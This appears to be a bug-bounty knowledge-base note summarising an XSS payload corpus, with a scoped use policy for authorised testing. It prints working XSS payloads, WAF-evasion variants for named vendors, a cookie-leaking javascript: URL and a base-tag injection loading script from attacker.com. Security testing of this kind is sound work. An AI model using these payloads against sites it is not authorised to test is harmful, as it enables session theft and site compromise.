---
type: payload-corpus
status: reference
source: https://xss-payloads.paracyberbellum.io/payloads
fetched: "2026-07-01T15:33:40.459695+02:00"
records: 470
---

# ParaCyberBellum XSS Payload Corpus

Source: <https://xss-payloads.paracyberbellum.io/payloads>

Local full decoded corpus:

```text
02 - Vulnerability Playbooks/Web2/XSS/paracyberbellum-payloads.decoded.json
```

## Use policy

Use this corpus as a **context-selection reference**, not as a spray list.

1. Start by identifying source and sink context: HTML text, attribute, URL, JS string/template, DOM API, markdown/rich text, SVG/file preview, postMessage, or storage-derived content.
2. Select one or two harmless payload shapes that match the context.
3. Prefer benign proof markers such as `alert(1)`, `confirm(1)`, `console.log('argus-xss')`, or a harmless DOM marker in an owned context.
4. Do not use payloads that exfiltrate cookies/tokens, send network beacons, spam users, or target real users.
5. WAF/evasion labels are for reproducing a context-specific bypass only after a sink is identified; do not use this as broad fuzzing.

## Corpus counts

| Field | Top values |
|---|---|
| `specificities` | `Alternative Execution` 151, `Encoding` 84, `101` 56, `mXSS` 56, `HTML Entities` 43, `Alternative Spacing` 41, `Remote Payload` 32, `Fragmentation` 28, `HTML Confusion` 21, `Constructor` 21, `Polyglot` 17, `Regexp` 14 |
| `evasions` | `Generic` 161, `CloudFlare` 37, `Akamai` 25, `Imperva` 11, `CloudFront` 9, `FortiWeb` 7, `DOMPurify` 6, `AngularJS Sandbox` 4, `FortiGate` 3, `Sucuri WAF` 3, `SnowJS Sandbox` 2, `F5 ASM` 2 |
| `html_tags` | `svg` 58, `img` 38, `input` 24, `body` 20, `details` 12, `iframe` 11, `html` 11, `a` 10, `object` 6, `base` 5, `marquee` 5, `form` 5 |
| `without` | `Space` 64, `eval()` 25, `Quotes` 24, `Parenthesis` 20, `< and/or >` 6, `Alphanumeric` 4, `Letters` 2 |

## Context buckets

| Bucket | Count | Use when |
|---|---:|---|
| `dom_svg_html` | 183 | HTML/SVG/event-handler sinks, rich text, file previews, DOM insertion. |
| `encoding_entities` | 157 | Output is decoded/normalized or filters block obvious syntax. |
| `mXSS_html_confusion` | 94 | Browser/parser repair, sanitizer differentials, nested markup, XML/SVG/MathML contexts. |
| `css_style` | 10 | Style/CSS sinks or HTML that allows style tags/attributes. |
| `open_redirect_url` | 23 | URL/navigation sinks, javascript: URL context, redirect parameters. |
| `waf_evasion_labelled` | 265 | A known sink exists and a filter/WAF blocks a simple proof. |
| `quote_space_less` | 100 | Attribute/JS contexts where quotes/spaces/parens/angle brackets are constrained. |

## Example payload shapes by bucket

These examples are copied as inert documentation. Adapt to harmless owned-context proof markers before use.

### dom_svg_html

- id `0ctJ8JfC`; tags `['svg']`; specificities `['Alternative Execution']`; evasions `[]`

```text
<svg onload=http://evt.target.ownerDocument.defaultView.alert(1337)>
```
- id `0n4slYg5`; tags `['iframe']`; specificities `['HTML Entities']`; evasions `['CloudFlare']`

```text
xss'''><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
```
- id `10vrrDwK`; tags `['svg']`; specificities `['mXSS']`; evasions `['Generic']`

```text
<svg onload="alert(1)" <="" svg=""
```
- id `1JZ0jFP1`; tags `['svg']`; specificities `['Alternative Execution']`; evasions `[]`

```text
<svg onload=valueOf().ownerDocument.defaultView.alert(1)>
```
- id `1Mp2nqhr`; tags `['svg']`; specificities `['HTML Entities']`; evasions `['CloudFlare']`

```text
<svg onload=alert&#0000000040document.cookie)>
```
### encoding_entities

- id `0DUAoKol`; tags `[]`; specificities `['Alternative Spacing', 'Encoding', 'Open Redirect']`; evasions `['Generic']`

```text
javascript://%250Aalert(document.location=document.cookie)
```
- id `0n4slYg5`; tags `['iframe']`; specificities `['HTML Entities']`; evasions `['CloudFlare']`

```text
xss'''><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
```
- id `1Mp2nqhr`; tags `['svg']`; specificities `['HTML Entities']`; evasions `['CloudFlare']`

```text
<svg onload=alert&#0000000040document.cookie)>
```
- id `1aP3GLq7`; tags `['svg']`; specificities `['Alternative Spacing', 'Encoding', 'HTML Entities']`; evasions `['Akamai', 'CloudFlare']`

```text
JavaScript:"\%0A74Svg/On%0ALoad=alert%25%0A26lpar;1%25%0A26rpar;>"
```
- id `1cXussGV`; tags `[]`; specificities `['Alternative Execution', 'Encoding']`; evasions `['Generic']`

```text
delete[a=this[atob('YWxlcnQ=')]]/prompt a(1)
```
### mXSS_html_confusion

- id `10vrrDwK`; tags `['svg']`; specificities `['mXSS']`; evasions `['Generic']`

```text
<svg onload="alert(1)" <="" svg=""
```
- id `1A4tSKkw`; tags `['base']`; specificities `['Remote Payload', 'HTML Confusion']`; evasions `['Generic']`

```text
<base href="//attacker.com/xss.js/" a="
```
- id `1Eavc7KY`; tags `[]`; specificities `['Polyglot']`; evasions `[]`

```text
javascript:/*</title></textarea></style --></xmp></script></noembed></noscript></math><svg/onload='//"/**/%0aonmouseover=alert()//'>${{7*2}}
```
- id `22qzP1Xg`; tags `['img']`; specificities `['Alternative Spacing', 'mXSS']`; evasions `['CloudFront']`

```text
>%0D%0A%0D%0A<x '="foo"<x foor='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>
```
- id `2XDCoPfG`; tags `['img']`; specificities `['HTML Entities', 'mXSS']`; evasions `['CloudFlare']`

```text
&lt;img longdesc="src='x'onerror=alert(document.domain);//&gt;&lt;img " src='showme'&gt;
```
### css_style

- id `DPLVqnlI`; tags `['style']`; specificities `['HTML Confusion']`; evasions `[]`

```text
<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
```
- id `Fl8qDYmy`; tags `['style']`; specificities `['101']`; evasions `[]`

```text
<style onLoad="javascript:javascript:alert(1)"></style>
```
- id `G9SvFfrC`; tags `[]`; specificities `['CSS']`; evasions `[]`

```text
window.onscroll=alert();
document.body.style.height='999px';
document.documentElement.scrollTop=1
```
- id `Mk60Bkqk`; tags `['style']`; specificities `['CSS']`; evasions `[]`

```text
<style>img{background-image:url('javascript:alert(1)')}</style>
```
- id `hwAWm7iS`; tags `['style']`; specificities `['CSS', 'Encoding']`; evasions `[]`

```text
<style>*{background-image:url('\6A\61\76\61\73\63\72\69\70\74\3A\61\6C\65\72\74\28\6C\6F\63\61\74\69\6F\6E\29')}</style>
```
### open_redirect_url

- id `0DUAoKol`; tags `[]`; specificities `['Alternative Spacing', 'Encoding', 'Open Redirect']`; evasions `['Generic']`

```text
javascript://%250Aalert(document.location=document.cookie)
```
- id `1Eavc7KY`; tags `[]`; specificities `['Polyglot']`; evasions `[]`

```text
javascript:/*</title></textarea></style --></xmp></script></noembed></noscript></math><svg/onload='//"/**/%0aonmouseover=alert()//'>${{7*2}}
```
- id `1aP3GLq7`; tags `['svg']`; specificities `['Alternative Spacing', 'Encoding', 'HTML Entities']`; evasions `['Akamai', 'CloudFlare']`

```text
JavaScript:"\%0A74Svg/On%0ALoad=alert%25%0A26lpar;1%25%0A26rpar;>"
```
- id `38U6IMEK`; tags `[]`; specificities `['Alternative Spacing', 'Open Redirect']`; evasions `['Generic']`

```text
javascript://sub.domain.com/%0Aalert(1)
```
- id `54wYpo6S`; tags `[]`; specificities `['Alternative Spacing', 'Open Redirect']`; evasions `['Generic']`

```text
javascript://www.whitelistddomain.tld?%a0alert%281%29
```
### waf_evasion_labelled

- id `0DUAoKol`; tags `[]`; specificities `['Alternative Spacing', 'Encoding', 'Open Redirect']`; evasions `['Generic']`

```text
javascript://%250Aalert(document.location=document.cookie)
```
- id `0n4slYg5`; tags `['iframe']`; specificities `['HTML Entities']`; evasions `['CloudFlare']`

```text
xss'''><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
```
- id `10vrrDwK`; tags `['svg']`; specificities `['mXSS']`; evasions `['Generic']`

```text
<svg onload="alert(1)" <="" svg=""
```
- id `1A4tSKkw`; tags `['base']`; specificities `['Remote Payload', 'HTML Confusion']`; evasions `['Generic']`

```text
<base href="//attacker.com/xss.js/" a="
```
- id `1CnGkPHZ`; tags `[]`; specificities `['Alternative Execution', 'Constructor']`; evasions `['Generic']`

```text
x=new class extends Function{}('alert(1)'); x=new x;
```
### quote_space_less

- id `0DUAoKol`; tags `[]`; specificities `['Alternative Spacing', 'Encoding', 'Open Redirect']`; evasions `['Generic']`

```text
javascript://%250Aalert(document.location=document.cookie)
```
- id `0n4slYg5`; tags `['iframe']`; specificities `['HTML Entities']`; evasions `['CloudFlare']`

```text
xss'''><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
```
- id `10vrrDwK`; tags `['svg']`; specificities `['mXSS']`; evasions `['Generic']`

```text
<svg onload="alert(1)" <="" svg=""
```
- id `2vi8KEZZ`; tags `['details']`; specificities `['HTML Entities']`; evasions `['Imperva']`

```text
<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
```
- id `3Szk5BXb`; tags `[]`; specificities `['Fragmentation']`; evasions `['Akamai']`

```text
';k='e'%0Atop['al'+k+'rt'](1)//
```

## Argus reportability reminder

A payload firing is not enough. A useful XSS report still needs:

- in-scope asset and owned/allowed context;
- exact source-to-sink path;
- minimal payload that matches the sink context;
- proof of script execution or security-relevant DOM effect;
- victim/second-owned-account proof for stored/cross-user impact;
- CSP/sanitizer/browser notes;
- no real-user data, no credential exfiltration, no spam, no persistence beyond a harmless owned object.
